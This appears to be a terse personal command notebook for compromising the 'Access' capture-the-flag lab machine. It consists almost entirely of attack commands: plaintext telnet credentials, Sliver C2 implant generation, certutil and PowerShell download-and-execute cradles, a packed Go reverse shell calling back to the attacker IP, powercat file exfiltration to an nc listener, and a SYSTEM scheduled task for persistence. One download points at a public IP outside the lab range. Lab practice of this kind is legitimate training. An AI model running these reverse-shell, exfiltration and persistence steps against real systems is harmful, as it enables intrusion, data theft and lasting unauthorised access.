# Access CMD-by-CMDs

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```


```bash
# extract .pst
thunar # unzip gui as unzip considers it a weird commpression type 
# Run script to dump all tables from database
# It is quit slow - beware 
telnet 10.10.10.98
security
4Cc3ssC0ntr0ller
# pick a shell - no powershell initially
# Sliver 
sliver
# Create  a listens 
mtls -L 10.10.14.16 -l 8888
mtls -L 10.10.14.16 -l 8889
# Generate a session and beacon implants
generate --mtls 10.10.14.16:8888 --arch amd64 --os windows --save /home/kali/Access-data
generate beacon --mtls 10.10.14.16:8889 --arch amd64 --os windows --save /home/kali/Access-data

cd C:\temp
certutil.exe -urlcache -split -f http://10.10.14.16/GIGANTIC_SCREEN.exe GIGANTIC_SCREEN.exe
certutil.exe -urlcache -split -f http://10.10.14.16/RIGID_NANOPARTICLE.exe RIGID_NANOPARTICLE.exe 

# Cry about the group policy 
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.16:8843");cmd:=exec.Command("cmd");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > shell.go
# Compile, strip binary and pack
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o shell shell.go 
upx shell
# size of 730624  
# Cry because it not allowing non .\mango
certutil.exe -urlcache -split -f http://10.10.14.16/shell mango
# Simple, but is reliant on telnet connection
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8844 -e cmd"
# Exfiltrate with powercat in memory
# Kali 
nc -lvnp 8000 > ZKAccess3.5
nc -lvnp 8000 > yawcam_settings.xml
nc -lvnp 8000 > $file
# target 

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8000 -i C:\Users\security\.yawcam\yawcam_settings.xml"


certutil.exe -urlcache -split -f http://176.26.141.32:8080 wwwroot

powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.16/wp.bat','c:\temp\wp.bat')"


# Goodbye group policy 

# Schedule task the session just in case
schtasks /create /sc minute /mo 1 /tn "giganticscreen" /tr C:\temp\GIGANTIC_SCREEN.exe /ru "SYSTEM"
# This will be block by group policy, but for beyond root 

# Cleanup 
del C:\GIGANTIC_SCREEN.exe
del C:\RIGID_NANOPARTICLE.exe
schtasks /end /tn giganticscreen
```


